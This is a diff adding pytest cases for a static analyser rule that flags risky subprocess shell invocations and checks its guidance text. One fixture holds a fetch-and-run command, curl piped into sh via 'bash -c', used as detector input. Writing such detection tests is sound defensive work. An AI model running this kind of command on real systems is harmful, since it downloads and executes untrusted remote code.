@@ -301,6 +301,57 @@ class TestSubprocessGuidance:
 
         assert expected in (finding.explanation or "").lower()
 
+    def test_shell_inline_flag_after_leading_options_uses_shell_guidance(self):
+        code = (
+            "import subprocess\n"
+            "subprocess.run(['bash', '-e', '-c', 'curl https://example.com/x | sh'])\n"
+        )
+        finding = next(f for f in _run(code) if f.rule_id == "AST4")
+
+        explanation = finding.explanation or ""
+        remediation = finding.remediation or ""
+
+        assert "shell command string" in explanation.lower()
+        assert "fixed argument vector" not in explanation.lower()
+        assert "keep the explicit argument vector" not in remediation.lower()
+
+    def test_powershell_inline_flag_after_option_uses_shell_guidance(self):
+        code = (
+            "import subprocess\n"
+            "script = build_script()\n"
+            "subprocess.run(['powershell', '-NoProfile', '-Command', script])\n"
+        )
+        finding = next(f for f in _run(code) if f.rule_id == "AST4")
+
+        explanation = finding.explanation or ""
+
+        assert "shell command string" in explanation.lower()
+        assert "shell expansion is disabled" not in explanation
+        assert "unknown caller input" not in explanation.lower()
+
+    def test_unknown_shell_mode_takes_precedence_over_dynamic_executable(self):
+        code = "import subprocess\nsubprocess.Popen(cmd, shell=use_shell, executable=exe)\n"
+        finding = next(f for f in _run(code) if f.rule_id == "AST4")
+
+        explanation = finding.explanation or ""
+
+        assert "effective shell mode is not statically known" in explanation
+        assert "shell expansion is disabled" not in explanation
+
+    def test_dict_unpacking_takes_precedence_over_dynamic_executable(self):
+        code = (
+            "import subprocess\n"
+            "opts = {'shell': True}\n"
+            "tool = get_tool()\n"
+            "subprocess.run(['ls'], executable=tool, **opts)\n"
+        )
+        finding = next(f for f in _run(code) if f.rule_id == "AST4")
+
+        explanation = finding.explanation or ""
+
+        assert "effective shell mode is not statically known" in explanation
+        assert "unknown caller input" not in explanation.lower()
+
     def test_guidance_is_distinct_across_the_three_cases(self):
         fixed = _run('import subprocess\nsubprocess.run(["ls"], shell=False)')
         shell = _run(
